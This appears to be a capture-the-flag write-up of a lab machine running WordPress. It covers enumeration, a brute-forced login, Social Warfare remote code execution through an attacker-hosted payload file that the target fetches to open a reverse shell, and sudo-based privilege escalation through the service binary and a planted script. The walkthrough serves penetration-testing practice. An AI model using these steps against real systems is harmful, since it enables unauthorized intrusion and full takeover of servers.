We have the ip on the machine and we get the nmap results.

We have 2 ports open on it 22 and 80. We go for website first.

We can see a wordpress dir after running a dirb scan. Enumerate the wordpress users.

We see 2 users max and admin. We can brute-force the password for user max.
max:opensesame.

Now, we found the users but we also saw there that there were no plugins or themes so that was pretty much uuseless here.

But in the profile page of max we can see something called [social warfare](https://wpscan.com/vulnerability/9259) data. Now this is a classic RCE vuln.

Now we make a payload.txt file and host our own http server using python.

python3 -m http.server 80. Mark that payload.txt file should be in the same dir where you start the server.

__http://mach_ip/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://ifconfig_ip/rce_payload.txt__

we put in reverse shell code in payload file and listen on port we kept.

We got a shell and we navigate over to user max's dir. There we find 2 txt files which we cant open and an rsa priv key
deep within the dir(s).

As we have the rsa key we can ssh into server as max and get the first flag.

We can use sudo -l command here to see who else has access to which commands. Here, steven can use /usr/sbin/service.
We can use that login as steven as it requires no password.

sudo -u steven /usr/sbin/service ../../bin/bash.

NOTE: /bin/bash is always in the root folder. So we need to switch dir ../../ from home to root.

We can use the same sudo -l command to see root user has access to run a script. Here, root can /opt/tools/
server-health.sh

But we can't find any scripts like that. So we can make one.

server-health.sh 
--> 
#! /bin/bash
bash
<--

Running this script we can root access.

Now we can get both the flags steven and root.
